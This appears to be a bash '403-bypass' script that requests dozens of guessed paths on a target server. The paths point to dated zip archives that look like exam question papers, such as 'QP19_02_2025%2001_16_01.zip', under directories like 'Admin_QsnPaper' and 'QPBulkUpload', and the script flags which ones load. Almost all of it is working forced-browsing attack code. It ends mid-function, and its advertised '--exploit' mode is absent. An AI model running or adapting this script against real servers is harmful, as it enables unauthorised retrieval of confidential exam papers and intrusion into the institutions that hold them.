#!/bin/bash
#color
red='\e[31m'
green='\e[32m'
blue='\e[34m'
cyan='\e[96m'
ltcyan='\e[96m'
yellow='\e[33m'
black='\e[38;5;016m'
bluebg='\e[48;5;038m'${black}
end='\e[0m'
termwidth="$(tput cols)"
function print(){
	status=$(echo ${code} | awk '{print $2}'|sed 's/,$//g')
	if [[ ${status} =~ 2.. ]];then
			printf "${green} ${code} ${end} 👌\n${payload}\n"
	elif [[ ${status} =~ 3.. ]]; then
			printf "${yellow} ${code} ${end}\n"
	elif [[ ${status} =~ 5.. ]]; then
			printf "${ltcyan} ${code} ${end}\n"
	else
			printf "${red} ${code} ${end}\n"
	fi
}
function banner(){
	echo "💀💀💀💀💀💀💀💀💀"
	echo -e "💀$green Have a beer🍺💀 $end"
}
function usage(){
        printf "Usage:\n"
        printf "\t403-bypass [URL]\n">&2
        printf '\n' >&2
        printf "\t-u, --url URL\t\t\ttarget DOMAIN.TLD/PATH\n">&2
		printf '\n' >&2
		printf "BYPASS MODEs\n">&2
		printf "\t--encode\t\t\tURL Encode Bypass\n">&2\
		printf '\n' >&2
		printf "ALL BYPASSES\n">&2
		printf "\t--exploit\t\t\tComplete Scan: 403/401 bypass modes \n">&2
		printf '\n' >&2
		printf "\t${green}GREEN${end}\t:\t${green}2xx Status Code${end}\n">&2
		printf "\t${yellow}YELLOW${end}\t:\t${yellow}3xx Status Code${end}\n">&2
		printf "\t${red}RED${end}\t:\t${red}4xx Status Code${end}\n">&2
		printf "\t${ltcyan}BLUE${end}\t:\t${ltcyan}5xx Status Code${end}\n">&2
}
function URL_Encode_Bypass(){
	echo -e ${blue}"----------------------"${end}
	echo -e ${cyan}"[+] URL Encode Bypass "${end}
	echo -e ${blue}"----------------------"${end}
	
	echo -n "Payload [QP02_12_2023%2008_53_31.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_31.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_31.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
  echo -n "Payload [QP02_12_2023%2008_53_32.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_32.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_32.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
  echo -n "Payload [QP02_12_2023%2008_53_33.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_33.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_33.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
 
echo -n "Payload [QPBulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper-Workflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper-Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper-Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt-Mgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt-Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt-Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUploadQPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUploadQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUploadQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmtAutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmtAutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmtAutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin_QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulkHandling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkHandling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkHandling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdminService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdminService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdminService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module-QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBDataMassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBDataMassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBDataMassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops-QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP_Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler_Manager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ModuleQstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ModuleQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ModuleQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaperAutomation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaperAutomation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaperAutomation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync-QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploaderQPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploaderQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploaderQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAutoDataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAutoDataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAutoDataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard_QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Dashboard_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring-QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaperUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaperUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaperUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper_Control/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper_Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper_Control/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch-Upload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch-Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch-Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring_QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform-QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform-QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform-QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflowDashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflowDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflowDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler_DataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler_DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler_DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P-UploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P-UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P-UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin-QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflowProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflowProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflowProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline-QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper-Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager_QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
